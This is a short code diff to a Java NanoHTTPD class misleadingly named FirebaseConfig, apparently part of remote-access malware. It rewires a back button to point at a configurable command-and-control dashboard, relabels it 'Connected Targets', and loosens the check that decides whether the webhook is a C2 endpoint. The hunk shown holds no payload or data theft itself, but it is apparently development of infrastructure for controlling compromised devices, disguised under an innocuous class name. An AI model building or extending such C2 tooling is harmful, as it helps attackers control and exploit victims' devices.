@@ -237,8 +237,10 @@ public class FirebaseConfig extends NanoHTTPD {
                 "  </div>";
         }
 
+        String c2Url = com.labs.labrats.BuildConfig.WEBHOOK_URL;
+        if (c2Url == null || c2Url.trim().isEmpty()) c2Url = "/c2-dashboard";
         String renderBackBtn = isRenderWebhook() ? 
-            "<a href=\"/c2-dashboard\" class=\"render-c2-back-btn\">&#8592; Render C2</a>" : "";
+            "<a href=\"" + c2Url + "\" class=\"render-c2-back-btn\">&#9166; Connected Targets</a>" : "";
 
         return "<!DOCTYPE html>" +
             "<html lang=\"en\">" +
@@ -262,10 +264,7 @@ public class FirebaseConfig extends NanoHTTPD {
         String url = com.labs.labrats.BuildConfig.WEBHOOK_URL;
         if (url == null || url.trim().isEmpty()) return false;
         String low = url.toLowerCase().trim();
-        if (low.contains("script.google.com") || low.contains("script.googleusercontent.com") || low.contains("google")) {
-            return false;
-        }
-        return low.contains("render") || low.startsWith("http://") || low.startsWith("https://");
+        return !low.contains("script.google.com") && !low.contains("script.googleusercontent.com") && !low.contains("google.com");
     }
 
     public String getFooter() {
